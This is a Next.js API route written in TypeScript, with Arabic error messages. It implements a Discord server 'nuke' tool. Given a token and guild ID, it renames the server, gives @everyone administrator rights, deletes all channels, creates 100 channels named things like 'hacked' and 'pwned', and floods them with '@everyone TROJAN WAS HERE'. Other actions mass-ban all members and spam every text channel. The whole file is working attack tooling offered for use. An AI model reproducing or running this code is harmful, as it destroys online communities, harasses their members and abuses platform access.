import { NextRequest, NextResponse } from 'next/server'

export async function POST(req: NextRequest) {
  try {
    const { token, guildId, action, spamMessage, serverName } = await req.json()
    
    if (!token || !guildId || !action) {
      return NextResponse.json({ error: 'بيانات ناقصة' }, { status: 400 })
    }

    const stats = { deleted: 0, created: 0, spam_sent: 0, banned: 0 }
    
    const sleep = (ms: number) => new Promise(r => setTimeout(r, ms))
    
    // ═══════════════════════════════════════════════════════════════
    // ⚡ SUPER FAST PARALLEL API - Like Projector Bot!
    // ═══════════════════════════════════════════════════════════════
    
    const apiBatch = async (requests: Array<{method: string, endpoint: string, body?: object}>) => {
      const results = await Promise.allSettled(requests.map(async req => {
        try {
          const res = await fetch(`https://discord.com/api/v10/${req.endpoint}`, {
            method: req.method,
            headers: { 
              'Authorization': token, 
              'Content-Type': 'application/json' 
            },
            body: req.body ? JSON.stringify(req.body) : undefined
          })
          
          if (res.status === 204) return { success: true }
          return res.json().catch(() => ({}))
        } catch { return {} }
      }))
      return results.map(r => r.status === 'fulfilled' ? r.value : {})
    }

    const api = async (method: string, endpoint: string, body?: object) => {
      try {
        const res = await fetch(`https://discord.com/api/v10/${endpoint}`, {
          method,
          headers: { 
            'Authorization': token, 
            'Content-Type': 'application/json' 
          },
          body: body ? JSON.stringify(body) : undefined
        })
        
        if (res.status === 204) return { success: true }
        if (res.status === 429) {
          const data = await res.json().catch(() => ({}))
          await sleep(((data as any).retry_after || 0.3) * 1000)
          return api(method, endpoint, body)
        }
        return res.json().catch(() => ({}))
      } catch { return {} }
    }

    // ═══════════════════════════════════════════════════════════════
    // 💥 NUKE - SUPER FAST LIKE PROJECTOR BOT!
    // ═══════════════════════════════════════════════════════════════
    
    if (action === 'nuke') {
      // 1. Update server name
      await api('PATCH', `guilds/${guildId}`, { name: serverName || 'NUKED BY TRJ' })
      
      // 2. Get roles and modify @everyone
      const roles = await api('GET', `guilds/${guildId}/roles`)
      if (Array.isArray(roles)) {
        const everyone = roles.find((r: any) => r.name === '@everyone')
        if (everyone) {
          await api('PATCH', `guilds/${guildId}/roles/${(everyone as any).id}`, { 
            permissions: '8',
            mentionable: true 
          })
        }
      }
      
      // 3. Delete ALL channels at ONCE (Parallel)
      const channels = await api('GET', `guilds/${guildId}/channels`)
      if (Array.isArray(channels)) {
        const deleteRequests = channels.map((c: any) => ({
          method: 'DELETE',
          endpoint: `channels/${c.id}`
        }))
        
        // Delete in huge batches
        for (let i = 0; i < deleteRequests.length; i += 50) {
          const batch = deleteRequests.slice(i, i + 50)
          await apiBatch(batch)
          stats.deleted += batch.length
        }
      }
      
      // 4. Create 100 channels ALL AT ONCE!
      const names = ['nuked', 'trj', 'trojan', 'ez', 'wasted', 'owned', 'hacked', 'pwned', 'gg', 'rip']
      const createRequests = []
      
      for (let i = 0; i < 100; i++) {
        createRequests.push({
          method: 'POST',
          endpoint: `guilds/${guildId}/channels`,
          body: { 
            name: names[i % names.length] + '-' + Math.random().toString(36).substr(2, 5), 
            type: 0 
          }
        })
      }
      
      // Create ALL 100 channels in parallel batches of 20
      const createdChannels: any[] = []
      for (let i = 0; i < createRequests.length; i += 20) {
        const batch = createRequests.slice(i, i + 20)
        const results = await apiBatch(batch)
        results.forEach(res => {
          if (res?.id) {
            createdChannels.push(res)
            stats.created++
          }
        })
      }
      
      // 5. SPAM ALL CHANNELS AT ONCE!
      const msg = spamMessage || '@everyone TROJAN WAS HERE'
      const spamRequests = []
      
      for (const ch of createdChannels) {
        for (let j = 0; j < 10; j++) {
          spamRequests.push({
            method: 'POST',
            endpoint: `channels/${ch.id}/messages`,
            body: { content: msg }
          })
        }
      }
      
      // Spam in HUGE parallel batches of 50
      for (let i = 0; i < spamRequests.length; i += 50) {
        const batch = spamRequests.slice(i, i + 50)
        const results = await apiBatch(batch)
        stats.spam_sent += results.filter(r => (r as any).id).length
      }
      
    } else if (action === 'banall') {
      // ⚡ FAST BAN ALL - Parallel
      let after = ''
      
      while (true) {
        const members = await api('GET', `guilds/${guildId}/members?limit=1000${after ? `&after=${after}` : ''}`)
        
        if (!Array.isArray(members) || members.length === 0) break
        
        const toBan = members.filter((m: any) => !m.user?.bot)
        const banRequests = toBan.map((m: any) => ({
          method: 'PUT',
          endpoint: `guilds/${guildId}/bans/${m.user?.id}`,
          body: { delete_message_days: 7 }
        }))
        
        // Ban in parallel batches of 10
        for (let i = 0; i < banRequests.length; i += 10) {
          const batch = banRequests.slice(i, i + 10)
          const results = await apiBatch(batch)
          stats.banned += results.filter(r => (r as any).success || !(r as any).message).length
          await sleep(100)
        }
        
        if (members.length < 1000) break
        after = (members[members.length - 1] as any).user?.id
      }
      
    } else if (action === 'delete_channels') {
      // ⚡ INSTANT DELETE ALL
      const channels = await api('GET', `guilds/${guildId}/channels`)
      if (Array.isArray(channels)) {
        const deleteRequests = channels.map((c: any) => ({
          method: 'DELETE',
          endpoint: `channels/${c.id}`
        }))
        
        for (let i = 0; i < deleteRequests.length; i += 50) {
          const batch = deleteRequests.slice(i, i + 50)
          await apiBatch(batch)
          stats.deleted += batch.length
        }
      }
      
    } else if (action === 'spam') {
      // ⚡ MASSIVE SPAM
      const channels = await api('GET', `guilds/${guildId}/channels`)
      const msg = spamMessage || '@everyone TROJAN WAS HERE'
      
      if (Array.isArray(channels)) {
        const textChannels = channels.filter((c: any) => c.type === 0)
        const spamRequests = []
        
        for (const c of textChannels) {
          for (let i = 0; i < 50; i++) {
            spamRequests.push({
              method: 'POST',
              endpoint: `channels/${(c as any).id}/messages`,
              body: { content: msg }
            })
          }
        }
        
        // Spam in parallel batches of 50
        for (let i = 0; i < spamRequests.length; i += 50) {
          const batch = spamRequests.slice(i, i + 50)
          const results = await apiBatch(batch)
          stats.spam_sent += results.filter(r => (r as any).id).length
        }
      }
    }

    return NextResponse.json({ success: true, stats })
  } catch (error) {
    return NextResponse.json({ error: 'خطأ في الخادم' }, { status: 500 })
  }
}
